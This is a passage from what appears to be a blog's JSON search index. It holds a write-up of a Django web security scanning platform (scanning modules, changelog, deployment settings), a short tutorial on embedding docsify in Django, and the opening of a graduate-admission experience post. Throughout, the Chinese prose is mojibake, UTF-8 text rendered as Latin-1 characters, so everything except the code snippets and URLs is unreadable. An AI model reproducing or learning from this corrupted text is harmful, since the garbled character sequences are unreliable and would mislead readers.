æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå°†å…¶è½¬æ¢ä¸º Django å¯ä»¥è¯†åˆ«çš„æ•°æ®ï¼Œä½¿ä¹‹åœ¨å‰ç«¯è¿›è¡Œè¯»å–ã€‚\n\nè¦æ­£ç¡®è§£ææ•°æ®ï¼Œéœ€è¦å…ˆç†è§£ Python æ•°æ®ç»“æ„å’Œ JSON æ•°æ®çš„è½¬æ¢æ–¹æ³•ã€‚æˆ‘ä»¬åŸºäºå½“å‰çš„å›ºå®šçš„ JSON æ ¼å¼å»è§£æå–å¾—çš„æ•°æ®ã€‚\n\n### å®ç°æ•ˆæœ\n\n![ç›®å½•è¯†åˆ«](https://img.jwt1399.top//img/20210303174736.png)\n\n\n\n![ç›®å½•æ‰«æç»“æœ](https://img.jwt1399.top//img/20210619182009.png)\n\n## ä¿¡æ¯æ³„éœ²\n\nè¯¥æ¨¡å—ä¸»è¦ä¸ºç”¨æˆ·æä¾›å¸¸è§çš„ä¿¡æ¯æ³„éœ²æ£€æŸ¥ã€‚åœ¨å‰ç«¯ç›´è§‚çš„å±•ç¤ºåå°åœ°å€ã€é…ç½®æ–‡ä»¶ç­‰å¯èƒ½å­˜åœ¨æ³„éœ²çš„ä¿¡æ¯ï¼Œåœ¨ç»“æœåˆ—è¡¨ä¸­ï¼Œç”¨æˆ·å¯ä»¥éå¸¸æ¸…æ™°çš„çŸ¥é“æŸä¸ªWebæœåŠ¡å­˜åœ¨çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚\n\n![infoleak](https://img.jwt1399.top//img/20210620114317.png)\n\n## æ—ç«™æ¢æµ‹\n\nè¯¥æ¨¡å—ä¸»è¦å¯¹é€šè¿‡ IP åœ°å€ï¼Œç›´æ¥è·å–ä¸å½“å‰ IP æ‰€åœ¨æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒç½‘ç«™ï¼Œ æœ¬æ¨¡å—ç›´æ¥è°ƒç”¨ api å®ç°\n\n![æ—ç«™æ¢æµ‹](https://img.jwt1399.top//img/20210210100407.png)\n\n## åŸŸåæ¢æµ‹\n\nè¯¥æ¨¡å—ä¸»è¦é€šè¿‡è°ƒç”¨ api æ¥æ‰«æç½‘ç«™çš„å­åŸŸå\n\n![åŸŸåæ¢æµ‹](https://img.jwt1399.top//img/20210620114025.png)\n\n## å®‰å…¨å¯¼èˆª\n\nå®‰å…¨å¯¼èˆªé¡µé¢çš„çµæ„Ÿæ¥è‡ªäº[Viggo](http://viggoz.com/)å¤§ä½¬å¼€å‘çš„[Webstack](http://webstack.cc/)é¡¹ç›®ï¼Œè¯¥é¡¹ç›®æ˜¯åŸºäºBootstrapå¼€å‘çš„çº¯å‰ç«¯é¡µé¢ï¼Œå› æ­¤å‰ç«¯æˆ‘æ²¿ç”¨äº†`Webstack` çš„é£æ ¼å¹¶èåˆäº†`Tabler UI `é£æ ¼ï¼Œå¹¶ç”¨ `Django `å†™äº†åå°ç®¡ç†ï¼Œå¯åœ¨çº¿å¯¹åˆ†ç±»å’Œæ¡ç›®è¿›è¡Œç®¡ç†ã€‚\n\n### å‰ç«¯é¡µé¢\n\n![å¯¼èˆªå‰ç«¯](https://img.jwt1399.top//img/20210421004925.png)\n\n### åå°ç®¡ç†é¡µé¢\n\n![å¯¼èˆªåå°](https://img.jwt1399.top//img/20210421005730.png)\n\n### æ•°æ®åº“è®¾è®¡\n\n![](https://img.jwt1399.top//img/20210303172247.png)\n\n#### å¯¼èˆªæ¡ç›®-Item\n\n> æ ‡é¢˜title   æè¿°desc   ç½‘å€url   åˆ†ç±»category(å¤–é”®)   å›¾ç‰‡img    å›¾ç‰‡å®½åº¦img_width\n\n```python\nclass Item(models.Model):\n    '''å¯¼èˆªæ¡ç›®'''\n    title = models.CharField(max_length=50,verbose_name='åç§°')\n    desc = models.TextField(max_length=100,verbose_name='æè¿°')\n    url = models.URLField(verbose_name='ç½‘å€',blank=True)\n    img = models.URLField(default='https://jwt1399.top/favicon.png',verbose_name='logo')\n    img_width = models.IntegerField(default=45, verbose_name='å›¾ç‰‡å®½åº¦')\n    category = models.ForeignKey(Category, blank=True, null=True, verbose_name='åˆ†ç±»', on_delete=models.CASCADE)\n    class Meta:\n        verbose_name=verbose_name_plural='å¯¼èˆªæ¡ç›®'\n    #åå°æ¡ç›®å›¾ç‰‡é¢„è§ˆ\n    def img_admin(self):\n        return format_html( '<img src=\"{}\" width=\"50px\" height=\"50px\" style=\"border-radius: 50%;\" />',self.img,)\n    img_admin.short_description = 'logoé¢„è§ˆ'\n    def __str__(self):\n        return self.title\n```\n\n#### æ¡ç›®åˆ†ç±»-Category\n\n> åç§°name   æ’åº sort   æ˜¯å¦æ·»åŠ åˆ°å¯¼èˆªæ add_menu   å›¾æ ‡icon\n\n```python\nclass Category(models.Model):\n    \"\"\"æ¡ç›®åˆ†ç±»\"\"\"\n    name = models.CharField(max_length=20, verbose_name='åç§°')\n    sort = models.IntegerField(default=1, verbose_name='æ˜¾ç¤ºé¡ºåº')\n    add_menu = models.BooleanField(default=True, verbose_name='æ·»åŠ åˆ°å¯¼èˆªæ ')\n    icon = models.CharField(max_length=30, default='fas fa-home',verbose_name='å›¾æ ‡')\n    class Meta:\n        verbose_name_plural=verbose_name = 'åˆ†ç±»'\n\n    #ç»Ÿè®¡åˆ†ç±»å¯¹åº”æ¡ç›®æ•°,å¹¶æ”¾å…¥åå°\n    def get_items(self):\n        return len(self.item_set.all())\n    get_items.short_description = 'æ¡ç›®æ•°'  # è®¾ç½®åå°æ˜¾ç¤ºè¡¨å¤´\n    #åå°å›¾æ ‡é¢„è§ˆ\n    def icon_data(self):#å¼•å…¥Font Awesome Free 5.11.1\n        return format_html('<h1><i class=\"{}\"></i></h1>',self.icon) #è½¬åŒ–ä¸º<i class=\"{self.icon}\"></i>\n    icon_data.short_description = 'å›¾æ ‡é¢„è§ˆ'\n    def __str__(self):\n        return self.name\n```\n\n## æ–‡æ¡£é¡µ\n\nå°† Docsify ç›´æ¥åµŒå…¥äº† Django ä¸­æ„é€ äº†æ–‡æ¡£é¡µã€‚\n\n![æ–‡æ¡£é¡µ](https://img.jwt1399.top//img/20210620113024.png)\n\n## å…¼å®¹æ€§\n\n### Phoneç«¯\n\n| ç«–å±                                                 | æ¨ªå±                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20210620134517.png) | ![](https://img.jwt1399.top//img/20210620134520.png) |\n\n### Padç«¯\n\n| ç«–å±                                                 | æ¨ªå±                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20210620134523.png) | ![](https://img.jwt1399.top//img/20210620134527.png) |\n\n## ç‰ˆæœ¬å˜æ›´è®°å½•\n\n### v2.7ï¼ˆ2021-04-18ï¼‰\n\n- æ–°å¢`åŸŸåæ¢æµ‹`åŠŸèƒ½ï¼›\n- æ–°å¢`ä¸­é—´ä»¶æ¼æ´`æ‰«æï¼›\n- ä¿®å¤`å¿˜è®°å¯†ç `åŠŸèƒ½ï¼›\n- ä¼˜åŒ–AWVSæœªå¯åŠ¨æŠ¥é”™ä¿¡æ¯ï¼›\n- ä¼˜åŒ–`ç”¨æˆ·ç™»å½•`é€»è¾‘ï¼›\n- ä¼˜åŒ–`æ¼æ‰«è¯¦æƒ…`é¡µUIï¼›\n- ä¼˜åŒ–å¯¼èˆªæ å¸ƒå±€ï¼›\n- ä¼˜åŒ–è‹¥å¹²å°ç»†èŠ‚ï¼›\n\n### v2.6ï¼ˆ2021-03-31ï¼‰\n\n- æ–°å¢æ¼æ´`æ‰«æè¯¦æƒ…`åŠŸèƒ½ï¼›\n- æ–°å¢é¦–é¡µ `ä»ªè¡¨ç›˜`ï¼›\n- å®‰å…¨å¯¼èˆªé¡µå¯¼èˆªæ `ç§»åŠ¨ç«¯ä¼˜åŒ–`ï¼›\n- å®‰å…¨å¯¼èˆªé¡µç›®å½•æ `ç¼©æ”¾ä¼˜åŒ–`ï¼›\n- æ³¨å†Œ&ç™»å½•ç•Œé¢ä¼˜åŒ–ï¼›\n- æ–‡æ¡£é¡µ`å¯¼èˆªæ ä¼˜åŒ–`ï¼›\n- æ–°å¢ `UI` å¤œé—´æ¨¡å¼ï¼›\n- ä¿®å¤è‹¥å¹²`UI` æ˜¾ç¤ºBugï¼›\n\n### v2.5ï¼ˆ2021-03-02ï¼‰\n\n- æ–°å¢äº†`æ¼æ´æ‰«æ`åŠŸèƒ½ï¼›\n- ç«¯å£æ‰«æé¡µæ–°å¢`å¸¸è§ç«¯å£æŸ¥è¯¢è¡¨`ï¼›\n- ä¿¡æ¯æ³„éœ²é¡µæ–°å¢`å¸¸è§ä¿¡æ¯æ³„éœ²åˆ—è¡¨`ï¼›\n- æŒ‡çº¹è¯†åˆ«é¡µæ–°å¢`æ•°æ®åˆ†æ`å›¾è¡¨ï¼›\n- æ¼æ´æ‰«æé¡µ`ç•Œé¢ä¼˜åŒ–`ï¼›\n\n### v2.4ï¼ˆ2021-02-22ï¼‰\n\n- æ–°å¢äº†`ç›®å½•è¯†åˆ«`åŠŸèƒ½ï¼›\n- é‡å†™`æ¬¢è¿é¡µ`ï¼›\n- å®‰å…¨å¯¼èˆªé¡µ`ç§»åŠ¨ç«¯ç•Œé¢`é€‚é…ï¼›\n- å®‰å…¨å¯¼èˆªé¡µ`UIä¼˜åŒ–`ï¼›\n- ç›®å½•è¯†åˆ«é¡µ`ç•Œé¢ä¼˜åŒ–`ï¼›\n- æŒ‡çº¹è¯†åˆ«é¡µæ–°å¢`å¸¸è§æŒ‡çº¹`æ˜¾ç¤ºä¸æœç´¢ï¼›\n- å¼•å…¥`Boostrap Table`å®ç°åˆ†é¡µï¼›\n- æ·˜æ±° `LayUI` æ”¹ç”¨ `Layer` è¿›è¡Œå¼¹çª—ï¼›\n- æ–‡æ¡£é¡µå¢åŠ `å¯¼èˆªæ `ï¼›\n\n### v2.3ï¼ˆ2021-02-08ï¼‰\n\n- å…¨æ–°çš„`é¡µé¢å¸ƒå±€`ï¼›\n- UIé€‚é…`ç§»åŠ¨ç«¯`ï¼›\n- ä¼˜åŒ–`å¯¼èˆªé¡µå¸ƒå±€`ï¼›\n- ä¼˜åŒ–ä¸€ç³»åˆ—`UI`æ˜¾ç¤ºé—®é¢˜ï¼›\n    - ä¼˜åŒ–äº†`æ‰‹æœºç«¯é¡µè„š`æ˜¾ç¤º\n    - ä¼˜åŒ–äº†`å¹³æ¿ç«¯å¯¼èˆªæ¡`æ˜¾ç¤º\n    - é¡µé¢åº•éƒ¨å¢åŠ `å›åˆ°é¡¶éƒ¨`æŒ‰é’®\n    - æŒ‰é’®`è§¦å‘è·³è½¬`é¡µé¢ç›¸å¯¹ä½ç½®\n    - `å›è½¦é”®`è§¦å‘æŸ¥è¯¢æŒ‰é’®\n    - ä¼˜åŒ–`å¯¼èˆªé¡µé¡µè„š`æ˜¾ç¤º\n\n### v2.2 ï¼ˆ2021-02-03ï¼‰\n\n- æ–°å¢äº†`ä¿¡æ¯æ³„éœ²æ¢æµ‹`åŠŸèƒ½ï¼›\n- æ–°å¢äº†`æ—ç«™æ¢æµ‹`åŠŸèƒ½ï¼›\n- æ–°å¢äº†å¯¼èˆªé¡µ`æ•°æ®åˆ†æ`åŠŸèƒ½ï¼›\n- æ–°å¢äº†åŸºäº`Docsify`çš„`æ–‡æ¡£é¡µ`ï¼›\n- é‡æ„äº†`é™æ€æ–‡ä»¶static`æ–‡ä»¶ç»“æ„\n- ä¼˜åŒ–äº†é¡¹ç›®`æ–‡ä»¶ç»“æ„`ï¼›\n- ç¾åŒ–äº†`æ³¨å†Œ`é¡µé¢ï¼›\n- å¼•å…¥äº†`åŠ¨æ€ç²’å­`èƒŒæ™¯æ•ˆæœï¼›\n- ä¿®å¤äº†ä¸€äº› `UI` æ˜¾ç¤ºé—®é¢˜ï¼›\n\n### v2.1 ï¼ˆ2021-01-13ï¼‰\n\n- æ–°å¢äº†`æŒ‡çº¹è¯†åˆ«`åŠŸèƒ½ï¼›\n- æ–°å¢äº†`ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½`åŠŸèƒ½ï¼›\n- æ–°å¢äº†`æ¬¢è¿é¡µ`ï¼›\n- ~~æ–°å¢äº†`æ–‡æ¡£é¡µ`ï¼›~~\n- ä¿®å¤äº†ä¸€äº› `UI` æ˜¾ç¤ºé—®é¢˜ï¼›\n\n### v2.0ï¼ˆ2021-01-04ï¼‰\n\n- æ–°å¢äº†`ç«¯å£æ‰«æ`åŠŸèƒ½ï¼›\n- æ–°å¢äº†`å®‰å…¨å¯¼èˆª`åŠŸèƒ½ï¼›\n- è¿å…¥äº† `SQLite` æ•°æ®åº“ï¼Œåç»­è€ƒè™‘æ”¹ä¸º`MySQL`ï¼›\n- ä¿®å¤äº†ä¸€äº› `UI` æ˜¾ç¤ºé—®é¢˜ï¼›\n- ä¿®å¤äº†åå°å¤´éƒ¨å°å›¾æ ‡æ— æ³•æ˜¾ç¤ºé—®é¢˜ï¼›\n- æ–°å¢äº†åå°æ•°æ®å¯¼å…¥å¯¼å‡ºåŠŸèƒ½ï¼›\n\n### v1.0ï¼ˆ2020-12-20ï¼‰\n\n- åŸºäº`Tabler`æ¡†æ¶æ„é€ äº†å‰ç«¯é¡µé¢ï¼›\n- é‡‡ç”¨åŸºäº`Python`çš„ Django æ¡†æ¶ç¼–å†™åç«¯ï¼›\n- å¼•å…¥äº†`SimpleUi`ç¾åŒ– Django åå°æ¡†æ¶ï¼›\n- å¼•å…¥äº†`Font-Awsome 5.15.1`å›¾æ ‡ï¼›\n\n## é¡¹ç›®éƒ¨ç½²\n\n### æœ¬åœ°éƒ¨ç½²\n\n1.ä½¿ç”¨ Pycharm æ‰“å¼€æœ¬é¡¹ç›®ï¼Œåœ¨ Pycharm çš„ `setting`--->`Project Interpreter`ä¸­ add ä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒã€‚\n\n2.åœ¨è¯¥è™šæ‹Ÿç¯ä¸‹æ‰“å¼€ Pycharm è‡ªå¸¦ Terminal è¿è¡Œ `pip install -r requirements.txt` ä¸‹è½½é¡¹ç›®æ‰€éœ€çš„ç¬¬ä¸‰æ–¹åŒ…ã€‚\n\n3.ç°åœ¨é¡¹ç›®å·²ç»å¯ä»¥æ­£å¸¸è¿è¡Œäº†ï¼Œä½†æ˜¯æƒ³è¦ä½¿ç”¨æ¼æ´æ‰«æåŠŸèƒ½ï¼Œéœ€è¦å®‰è£…AWVSï¼Œå¹¶åœ¨é¡¹ç›®çš„`setting.py` ä¸­é…ç½® AWVSçš„ `API URL`å’Œ`API KEY`\n\n4.å¿˜è®°å¯†ç åŠŸèƒ½ç›¸å…³é…ç½®åœ¨é¡¹ç›®çš„`setting.py` ä¸­ä¿®æ”¹\n\n```python\nEMAIL_HOST = 'smtp.163.com'\nEMAIL_PORT = 25               # å‘ä»¶ç®±çš„smtpæœåŠ¡å™¨ç«¯å£\nEMAIL_HOST_USER = 'xxx'       # ä½ çš„é‚®ç®±è´¦å·\nEMAIL_HOST_PASSWORD =\"xxx\"    # é‚®ç®±æˆæƒç \nEMAIL_USE_TLS = True          # è¿™é‡Œå¿…é¡»æ˜¯ Trueï¼Œå¦åˆ™å‘é€ä¸æˆåŠŸ\nEMAIL_FROM = 'xxx'            # ä½ çš„é‚®ç®±è´¦å·\nDEFAULT_FROM_EMAIL = 'xxx'    # ä½ çš„é‚®ç®±è´¦å·\n```\n\n5.åˆ›å»ºè¶…çº§ç®¡ç†å‘˜ `python manage.py createsuperuser`\n\n### æœåŠ¡å™¨éƒ¨ç½²\n\nè¯·å‚è€ƒï¼š[ä½¿ç”¨å®å¡”é¢æ¿å¿«é€Ÿéƒ¨ç½²Djangoé¡¹ç›®](https://www.django.cn/article/show-30.html)\n\n## TO DO\n\n> ä¸è®ºæ˜¯å¼€å‘è¿˜æ˜¯å®‰å…¨æ„Ÿè§‰éƒ½æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œè·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ï¼Œå…±å‹‰ ï¼\n\n- [ ] å®‰å…¨å·¥å…·é¡µ\n- [ ] å®‰å…¨å›¾ä¹¦é¡µ\n- [ ] å¼•å…¥MySQLæ•°æ®åº“\n- [ ] æ‰«æç®—æ³•ä¼˜åŒ–\n- [ ] ä»£ç å˜é‡ã€æ•°æ®åº“ç»“æ„ä¼˜åŒ–\n- [ ] æ¼æ´æŠ¥å‘Šå¯¼å‡ºåŠŸèƒ½\n- [ ] é¡µé¢å¼‚æ­¥åˆ·æ–°\n\n## èµåŠ©ğŸ’°\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ¸—é€æµ‹è¯•","æ¯•ä¸šè®¾è®¡","å·¥å…·å¼€å‘"],"categories":["Web"]},{"title":"Djangoå¼•å…¥docsifyæ–‡æ¡£","url":"/posts/61836.html","content":"![](https://img.jwt1399.top//img/20210131114325.png)\n### docsify ä»‹ç»\n>  **docsifyï¼š**ä¸€ä¸ªç¥å¥‡çš„æ–‡æ¡£ç«™ç‚¹ç”Ÿæˆå™¨ã€‚\n>\n> **å®˜ç½‘ï¼š**https://docsify.js.org/\n\næˆ‘ä»¬åœ¨å¼€å‘é¡¹ç›®æ—¶ï¼Œéœ€è¦ä¸€ä»½ç²¾è‡´çš„å¼€å‘æ–‡æ¡£ï¼Œé‚£ä¹ˆä½¿ç”¨ `docsify` æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œ`docsify` æ˜¯ä¸€ä¸ªå¿«é€Ÿç”Ÿæˆ `Vue` é£æ ¼æ–‡æ¡£çš„å·¥å…·ï¼Œå®ƒç›´æ¥åŠ è½½ `Markdown` æ–‡ä»¶å¹¶åŠ¨æ€æ¸²æŸ“ï¼ŒåŒæ—¶è¿˜å¯ä»¥ç”Ÿæˆå°é¢é¡µã€‚æˆ‘ä»¬åªéœ€è¦å†™å®Œ `Markdown` æ–‡æ¡£ï¼Œå°±å¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹æ–¹å›¾ç‰‡çš„æ–‡æ¡£é¡µé¢äº†ã€‚\n\n![](https://img.jwt1399.top//img/20210131103745.png)\n\nåŸºç¡€çš„é…ç½®å’Œæ­å»ºæˆ‘è¿™é‡Œå°±ä¸è¯´äº†ï¼Œå®˜ç½‘æœ‰è¯¦ç»†çš„æ­¥éª¤\n\n### docsify åµŒå…¥Djangoé¡¹ç›®\n\n1.æ ¹æ®å®˜ç½‘æ•™ç¨‹ç”Ÿæˆ `docs` æ–‡ä»¶å¤¹\n\n![](https://img.jwt1399.top//img/20210131110145.png)\n\n2.å°† `docs` æ–‡ä»¶å¤¹ï¼ˆé™¤å»index.htmlï¼‰æ”¾å…¥ **Django** é¡¹ç›®çš„ `static` æ–‡ä»¶å¤¹ä¸­ï¼ˆä¸‹å›¾æˆ‘å·²ç»åšäº†ä¸€äº›æ–‡æ¡£é…ç½®ï¼Œæ‰€ä»¥å¤šäº†ä¸€äº›æ–‡ä»¶ï¼‰\n\n![](https://img.jwt1399.top//img/20210131110537.png)\n\n3.å°† `docs` ä¸­çš„ `index.html` æ”¾å…¥ `templates` æ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘è¿™é‡Œå°† `index.html` æ”¹ä¸ºäº† `docs.html`\n\n![](https://img.jwt1399.top//img/20210131111242.png)\n\n4.åœ¨ `docs.html` ä¸­è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„\n\n```js\n<script>\n    window.$docsify = {\n    basePath:'/static/docs/',\n    ...\n    ...\n\t}\n</script>\n```\n\n5.åœ¨`view.py`å¢åŠ ä¸€ä¸ªè§†å›¾,è¿”å›æ–‡æ¡£é¦–é¡µ `docs.html`\n\n```python\ndef docs(request):\n    return render(request, 'docs.html')\n```\n6.åœ¨`urls.py`ä¸­å¢åŠ ä¸€ä¸ªè·¯ç”±\n\n```python\npath('docs', views.docs, name='docs'),\n```\n\n7.è¿è¡Œ Django é¡¹ç›®ï¼Œè®¿é—® `127.0.0.1:8000/docs` å°±å¯ä»¥æˆåŠŸçœ‹åˆ°æ–‡æ¡£é¡µäº†","tags":["Django"],"categories":["Python"]},{"title":"ä¿ç ”ç”µå­ç§‘å¤§ç»éªŒåˆ†äº«","url":"/posts/39301.html","content":"### å†™åœ¨å‰é¢\n\n> åŠªåŠ›ä¸ä¸€å®šæœ‰æ”¶è·ï¼Œä¸åŠªåŠ›å°±ä¸€å®šæ²¡æœ‰æ”¶è·ï¼Œæœºä¼šæ°¸è¿œæŠŠæ¡åœ¨è‡ªå·±æ‰‹é‡Œï¼Œè¶ŠåŠªåŠ›è¶Šå¹¸è¿ï¼é‡äº‹ä¸è¦æ€¥èºï¼Œæ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«ï¼\n\n2020å¹´10æœˆ12æ—¥11ç‚¹58åˆ†ï¼Œæ¥å—äº†ç”µå­ç§‘æŠ€å¤§å­¦çš„å¾…å½•å–é€šçŸ¥ï¼Œè‡³æ­¤æˆ‘çš„ä¿ç ”ä¹‹æ—…æ­£å¼ç»“æŸã€‚æ„Ÿè°¢ä¸€è·¯ä¸Šç»™äºˆæˆ‘å¸®åŠ©çš„å®¶äººã€è€å¸ˆå’Œæœ‹å‹ğŸ™ã€‚\n\n\n\n| æœ¬ç§‘å­¦æ ¡                                                     | ä¿ç ”æœ€ç»ˆå»å‘                                                 |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| <img src=\"https://img.jwt1399.top//img/20201013102356.jpeg\" width =\"400\" height=\"100\" /> | <img src=\"https://img.jwt1399.top//img/20201013095231\" width=\"500\" height=\"100\"/> |\n\n### ä¸ªäººæƒ…å†µ\n\n**æœ¬ç§‘å­¦æ ¡**ï¼šè¥¿åå¤§å­¦\n**æœ¬ç§‘ä¸“ä¸šï¼š**ä¿¡æ¯å®‰å…¨\n**æ”¿æ²»é¢è²Œï¼š**ä¸­å…±å…šå‘˜\n**ç»©ç‚¹**ï¼š3.81\n**æˆç»©æ’åï¼š**1/85ï¼ˆä¸“ä¸šç¬¬ä¸€ï¼‰\n**å››å…­çº§ï¼š**å››çº§ï¼ˆ475ï¼‰ã€å…­çº§æ²¡è¿‡ï¼ˆè‹±è¯­çœŸæ˜¯æˆ‘ä¸€ç”Ÿçš„ç—›å•ŠğŸ˜­ï¼Œæ˜æ˜çŸ¥é“é‡è¦ï¼Œä½†æˆ‘å°±æ˜¯ä¸æƒ³å­¦ï¼‰\n**å­¦ä¹ å®è·µç±»è·å¥–ï¼š**è¿ç»­ä¸‰å¹´æ ¡ä¸€ç­‰å¥–å­¦é‡‘ã€å›½å®¶å¥–å­¦é‡‘ã€å›½å®¶åŠ±å¿—å¥–å­¦é‡‘ã€å››å·çœå¤§å­¦ç”Ÿâ€œç»¼åˆç´ è´¨Açº§è¯ä¹¦â€ã€å››å·çœä¼˜ç§€å¤§å­¦æ¯•ä¸šç”Ÿ\n**å­¦ç”Ÿå·¥ä½œç±»è·å¥–ï¼š**æ ¡ä¼˜ç§€å…±é’å›¢å¹²éƒ¨ã€è¿ç»­ä¸¤å¹´æ ¡ä¼˜ç§€å­¦ç”Ÿå¹²éƒ¨ã€å…šæ ¡ä¼˜ç§€å­¦å‘˜ \n**å­¦ç§‘ç«èµ›ç±»è·å¥–ï¼š**ä¸­å›½å¤§å­¦ç”Ÿè®¡ç®—æœºè®¾è®¡å¤§èµ›ä¸‰ç­‰å¥– ã€å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ä¸å¯¹æŠ—æŠ€æœ¯ç«èµ›äºŒç­‰å¥–ã€å››å·çœå¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨æŠ€æœ¯å¤§èµ›ä¸€ç­‰å¥– ã€å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ›èµ›åŒºäºŒç­‰å¥–ã€å››å·çœè®¡ç®—æœºä½œå“å¤§èµ›äºŒç­‰å¥–ã€å››å·çœè®¡ç®—æœºè®¾è®¡å¤§èµ›äºŒç­‰å¥–ç­‰ç­‰\n\n### æˆ‘çš„ä¿ç ”æµç¨‹\n\n> ä»¥ä¸‹åªæ˜¯æˆ‘ä¸ªäººæ‰€ç»å†çš„æµç¨‹ï¼Œä»…ä¾›å‚è€ƒå“ˆï¼Œæˆ‘ä¸ªäººæ²¡æœ‰å‚åŠ å¤ä»¤è¥ï¼Œåªå‚åŠ äº†é¢„æ¨å…ã€‚\n>\n> æ³¨ï¼šä»Šå¹´å› ä¸ºç–«æƒ…åŸå› ï¼Œä¿ç ”å·¥ä½œæœ‰æ‰€æ¨è¿Ÿ\n\n`æµç¨‹ï¼šæœ¬æ ¡æ¨å…èµ„æ ¼ç”³è¯·-->è”ç³»é™¢æ ¡å’Œå¯¼å¸ˆ-->æ‹¿åˆ°æœ¬æ ¡æ¨å…èµ„æ ¼-->æŠ¥åé¢„æ¨å…-->å‚åŠ é¢„æ¨å…å¤è¯•-->å¡«æŠ¥æ¨å…ç³»ç»Ÿ`\n\n#### æœ¬æ ¡æ¨å…èµ„æ ¼ç”³è¯·\n\n9æœˆ10å·è¾…å¯¼å‘˜å‘å‡ºäº†ä¿ç ”é€šçŸ¥ï¼Œæœ‰æ„å‘çš„åŒå­¦æäº¤ç›¸åº”ç”³è¯·ææ–™ï¼Œåªéœ€è¦æŒ‰ç…§è¦æ±‚æäº¤ç›¸åº”çš„ææ–™å°±å¯ä»¥å•¦ã€‚\n\n#### **è”ç³»é™¢æ ¡å’Œå¯¼å¸ˆ**\n\nå…¶å®è¿™ä¸ªæ­¥éª¤å¯ä»¥å¾ˆæ—©å°±è¿›è¡Œï¼Œå› ä¸ºæˆ‘ä¸æ˜¯ååˆ†è‚¯å®šè‡ªå·±æ˜¯å¦èƒ½ä¿ç ”ï¼Œæäº¤ææ–™åï¼Œè¿‡å‡ å¤©è¾…å¯¼å‘˜ä¼šå‘ä¸€ä¸ªå¤§å­¦å‰ä¸‰å¹´çš„æˆç»©æ’åè¡¨ï¼Œé€šè¿‡æ’åæˆ‘ç¡®å®šè‡ªå·±æ˜¯å¯ä»¥ä¿ç ”çš„ï¼Œæ‰€ä»¥é©¬ä¸Šå¼€å§‹ç¡®å®šå­¦æ ¡å’Œå¯¼å¸ˆï¼Œå› ä¸ºæˆ‘ä¸æƒ³å‡ºå·ï¼Œæ‰€ä»¥å°†ç›®æ ‡é”å®šåœ¨äº†ç”µå­ç§‘æŠ€å¤§å­¦ã€å››å·å¤§å­¦ã€è¥¿å—äº¤é€šå¤§å­¦ä¸‰æ‰€å­¦æ ¡ä¸Šé¢ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°å·å¤§å¯¹å­¦ç”Ÿçš„æœ¬ç§‘å‡ºèº«è¦æ±‚å¾ˆé«˜ï¼ˆè²Œä¼¼985ã€211æ‰è¡Œï¼‰ï¼Œäºæ˜¯æœæ–­æ”¾å¼ƒäº†å·å¤§ï¼Œå…¶å®æœ€æƒ³å»çš„å­¦æ ¡æ˜¯ç”µå­ç§‘æŠ€å¤§å­¦ï¼Œç”µç§‘çš„è®¡ç®—æœºæ„Ÿè§‰è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œè€Œä¸”æ ¡å›­ç¯å¢ƒå¾ˆniceğŸ˜ï¼Œå»æ‰¾ä¸“ä¸šè€å¸ˆèŠäº†ä¸€å“ˆï¼Œè€å¸ˆç»™æˆ‘è¯´äº†å“ˆç”µç§‘å®éªŒå®¤å›¢é˜Ÿå’Œè€å¸ˆçš„ä¸€äº›æƒ…å†µï¼Œç»™æˆ‘æ¨èäº†å‡ ä½è€å¸ˆï¼Œå¹¶æ¨èæˆ‘å°è¯•ä¸€äº›å·å¤–çš„å­¦æ 